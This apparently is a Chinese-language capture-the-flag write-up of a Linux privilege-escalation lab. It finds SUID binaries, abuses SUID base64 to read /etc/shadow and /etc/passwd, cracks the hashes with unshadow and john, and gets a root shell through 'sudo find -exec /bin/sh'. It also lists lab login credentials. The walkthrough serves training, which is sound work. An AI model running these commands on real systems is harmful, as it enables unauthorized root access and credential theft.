---
title: "权限提升-Linux passwd提权"
date: "2024-03-04"
description: "@[TOC]"
---

@\[TOC\]

# [](#信息收集 "信息收集")信息收集

> ssh 连接到 目标机器  
> 您可以通过浏览器访问目标计算机或使用下面的 SSH 凭据。  
> **Username:** leonard  
> **Password:** Penny123  
> 直接查看 suid 的可执行文件  
> find / -perm -04000 2>/dev/null

```shell
/usr/bin/base64/usr/bin/ksu/usr/bin/fusermount/usr/bin/passwd/usr/bin/gpasswd/usr/bin/chage/usr/bin/newgrp/usr/bin/staprun/usr/bin/chfn/usr/bin/su/usr/bin/chsh/usr/bin/Xorg/usr/bin/mount/usr/bin/umount/usr/bin/crontab/usr/bin/pkexec/usr/bin/at/usr/bin/sudo/usr/sbin/pam_timestamp_check/usr/sbin/unix_chkpwd/usr/sbin/usernetctl/usr/sbin/userhelper/usr/sbin/mount.nfs/usr/lib/polkit-1/polkit-agent-helper-1/usr/libexec/kde4/kpac_dhcp_helper/usr/libexec/dbus-1/dbus-daemon-launch-helper/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper/usr/libexec/qemu-bridge-helper/usr/libexec/sssd/krb5_child/usr/libexec/sssd/ldap_child/usr/libexec/sssd/selinux_child/usr/libexec/sssd/proxy_child/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache/usr/libexec/flatpak-bwrap
```

> /usr/bin/base64 带suid的/usr/bin/base64 可以读取 /etc/passwd 和 /etc/shadow

# [](#passwd提权 "passwd提权")passwd提权

```shell
base64 /etc/shadow | base64 --decodebase64 /etc/passwd | base64 --decode
```

> 读出来后分别保存在1.txt 和2.txt中  
> 在攻击机器上 unshadow 1.txt 2.txt > 3  
> 直接 john 3 爆破  
> ![](https://files.catbox.moe/ycbdfb.png)  
> 但是无法爆破出root出来我们可以先登录到 missy用户

# [](#sudo提权 "sudo提权")sudo提权

> 登陆到missy先找一波flag1.txt  
> find / -name flag1.txt 2>/dev/null  
> 找到/home/missy/Documents/flag1.txt  
> 再次进行信息收集sudo -l 看看有什么执行文件有sudo权限  
> /usr/bin/find 只有一个find 本来还想玩玩 LD\_PRELOAD 但发现 没有这个env\_keep 可惜……….  
> 无所谓 find 命令照样提权
> 
> ```shell
> sudo find . -exec /bin/sh \; -quit 
> ```

# [](#flag2-txt "flag2.txt")flag2.txt

> root 权限下读取  
> /home/rootflag/flag2.txt
